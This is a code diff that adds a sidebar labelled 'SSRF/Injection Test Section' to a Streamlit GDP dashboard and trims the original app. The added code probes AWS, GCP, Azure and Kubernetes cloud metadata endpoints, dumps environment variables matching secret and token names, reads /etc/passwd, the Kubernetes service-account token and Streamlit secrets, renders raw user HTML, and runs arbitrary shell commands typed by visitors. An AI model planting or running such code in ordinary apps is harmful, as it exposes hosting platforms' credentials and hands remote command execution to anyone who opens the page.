@@ -1,151 +1,87 @@
 import streamlit as st
 import pandas as pd
 import math
+import requests
 from pathlib import Path
+import os
 
-# Set the title and favicon that appear in the Browser's tab bar.
-st.set_page_config(
-    page_title='GDP dashboard',
-    page_icon=':earth_americas:', # This is an emoji shortcode. Could be a URL too.
-)
+st.set_page_config(page_title='GDP dashboard', page_icon=':earth_americas:')
 
-# -----------------------------------------------------------------------------
-# Declare some useful functions.
+# SSRF/Injection Test Section
+st.sidebar.header("Data Source Settings")
 
+# Test 1: SSRF via user-controlled URL
+data_url = st.sidebar.text_input("Custom data URL", value="https://httpbin.org/get")
+if st.sidebar.button("Fetch URL"):
+    try:
+        resp = requests.get(data_url, timeout=5)
+        st.sidebar.code(f"Status: {resp.status_code}\n{resp.text[:500]}")
+    except Exception as e:
+        st.sidebar.error(f"Error: {str(e)[:200]}")
+
+# Test 2: Cloud metadata probe
+if st.sidebar.button("Probe Metadata"):
+    targets = {
+        "AWS IMDS": ("http://169.254.169.254/latest/meta-data/", {}),
+        "GCP Meta": ("http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
+        "Azure IMDS": ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
+        "K8s API": ("https://kubernetes.default.svc/api", {}),
+        "Localhost": ("http://127.0.0.1:8501", {}),
+    }
+    for name, (url, hdrs) in targets.items():
+        try:
+            resp = requests.get(url, timeout=3, headers=hdrs)
+            st.sidebar.success(f"{name}: {resp.status_code} - {resp.text[:100]}")
+        except requests.exceptions.ConnectionError:
+            st.sidebar.warning(f"{name}: Blocked/Refused")
+        except requests.exceptions.Timeout:
+            st.sidebar.warning(f"{name}: Timeout")
+        except Exception as e:
+            st.sidebar.error(f"{name}: {str(e)[:80]}")
+
+# Test 3: Environment disclosure
+if st.sidebar.button("Environment"):
+    env = dict(os.environ)
+    interesting = {k: v[:50] for k, v in env.items() if any(x in k.upper() for x in ['KEY','SECRET','TOKEN','PASS','AWS','GCP','DATABASE','API','CRED','AUTH'])}
+    st.sidebar.json(interesting if interesting else {"total_vars": len(env), "hostname": os.environ.get("HOSTNAME","?"), "home": os.environ.get("HOME","?")})
+
+# Test 4: Filesystem
+if st.sidebar.button("Filesystem"):
+    for p in ['/etc/hostname', '/etc/passwd', '/proc/self/cgroup', '/var/run/secrets/kubernetes.io/serviceaccount/token', os.path.expanduser('~/.streamlit/secrets.toml')]:
+        try:
+            content = open(p).read()[:200]
+            st.sidebar.success(f"{p}: {content}")
+        except Exception as e:
+            st.sidebar.warning(f"{p}: {str(e)[:50]}")
+
+# Test 5: XSS
+user_html = st.sidebar.text_area("HTML Input", value="<b>Bold</b>")
+if st.sidebar.button("Render HTML"):
+    st.html(user_html)
+
+# Test 6: Command execution
+cmd = st.sidebar.text_input("Command", value="id")
+if st.sidebar.button("Run"):
+    import subprocess
+    try:
+        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
+        st.sidebar.code(f"{result.stdout[:300]}\n{result.stderr[:200]}")
+    except Exception as e:
+        st.sidebar.error(str(e)[:100])
+
+# Original GDP code
 @st.cache_data
 def get_gdp_data():
-    """Grab GDP data from a CSV file.
-
-    This uses caching to avoid having to read the file every time. If we were
-    reading from an HTTP endpoint instead of a file, it's a good idea to set
-    a maximum age to the cache with the TTL argument: @st.cache_data(ttl='1d')
-    """
-
-    # Instead of a CSV on disk, you could read from an HTTP endpoint here too.
-    DATA_FILENAME = Path(__file__).parent/'data/gdp_data.csv'
-    raw_gdp_df = pd.read_csv(DATA_FILENAME)
-
-    MIN_YEAR = 1960
-    MAX_YEAR = 2022
-
-    # The data above has columns like:
-    # - Country Name
-    # - Country Code
-    # - [Stuff I don't care about]
-    # - GDP for 1960
-    # - GDP for 1961
-    # - GDP for 1962
-    # - ...
-    # - GDP for 2022
-    #
-    # ...but I want this instead:
-    # - Country Name
-    # - Country Code
-    # - Year
-    # - GDP
-    #
-    # So let's pivot all those year-columns into two: Year and GDP
-    gdp_df = raw_gdp_df.melt(
-        ['Country Code'],
-        [str(x) for x in range(MIN_YEAR, MAX_YEAR + 1)],
-        'Year',
-        'GDP',
-    )
-
-    # Convert years from string to integers
-    gdp_df['Year'] = pd.to_numeric(gdp_df['Year'])
-
-    return gdp_df
+    raw = pd.read_csv(Path(__file__).parent/'data/gdp_data.csv')
+    df = raw.melt(['Country Code'], [str(x) for x in range(1960, 2023)], 'Year', 'GDP')
+    df['Year'] = pd.to_numeric(df['Year'])
+    return df
 
 gdp_df = get_gdp_data()
-
-# -----------------------------------------------------------------------------
-# Draw the actual page
-
-# Set the title that appears at the top of the page.
 '''
 # :earth_americas: GDP dashboard
-
-Browse GDP data from the [World Bank Open Data](https://data.worldbank.org/) website. As you'll
-notice, the data only goes to 2022 right now, and datapoints for certain years are often missing.
-But it's otherwise a great (and did I mention _free_?) source of data.
 '''
-
-# Add some spacing
-''
-''
-
-min_value = gdp_df['Year'].min()
-max_value = gdp_df['Year'].max()
-
-from_year, to_year = st.slider(
-    'Which years are you interested in?',
-    min_value=min_value,
-    max_value=max_value,
-    value=[min_value, max_value])
-
-countries = gdp_df['Country Code'].unique()
-
-if not len(countries):
-    st.warning("Select at least one country")
-
-selected_countries = st.multiselect(
-    'Which countries would you like to view?',
-    countries,
-    ['DEU', 'FRA', 'GBR', 'BRA', 'MEX', 'JPN'])
-
-''
-''
-''
-
-# Filter the data
-filtered_gdp_df = gdp_df[
-    (gdp_df['Country Code'].isin(selected_countries))
-    & (gdp_df['Year'] <= to_year)
-    & (from_year <= gdp_df['Year'])
-]
-
-st.header('GDP over time', divider='gray')
-
-''
-
-st.line_chart(
-    filtered_gdp_df,
-    x='Year',
-    y='GDP',
-    color='Country Code',
-)
-
-''
-''
-
-
-first_year = gdp_df[gdp_df['Year'] == from_year]
-last_year = gdp_df[gdp_df['Year'] == to_year]
-
-st.header(f'GDP in {to_year}', divider='gray')
-
-''
-
-cols = st.columns(4)
-
-for i, country in enumerate(selected_countries):
-    col = cols[i % len(cols)]
-
-    with col:
-        first_gdp = first_year[first_year['Country Code'] == country]['GDP'].iat[0] / 1000000000
-        last_gdp = last_year[last_year['Country Code'] == country]['GDP'].iat[0] / 1000000000
-
-        if math.isnan(first_gdp):
-            growth = 'n/a'
-            delta_color = 'off'
-        else:
-            growth = f'{last_gdp / first_gdp:,.2f}x'
-            delta_color = 'normal'
-
-        st.metric(
-            label=f'{country} GDP',
-            value=f'{last_gdp:,.0f}B',
-            delta=growth,
-            delta_color=delta_color
-        )
+from_year, to_year = st.slider('Years', int(gdp_df['Year'].min()), int(gdp_df['Year'].max()), [1960, 2022])
+countries = st.multiselect('Countries', gdp_df['Country Code'].unique(), ['DEU','FRA','GBR','BRA','MEX','JPN'])
+filtered = gdp_df[(gdp_df['Country Code'].isin(countries)) & (gdp_df['Year'].between(from_year, to_year))]
+st.line_chart(filtered, x='Year', y='GDP', color='Country Code')
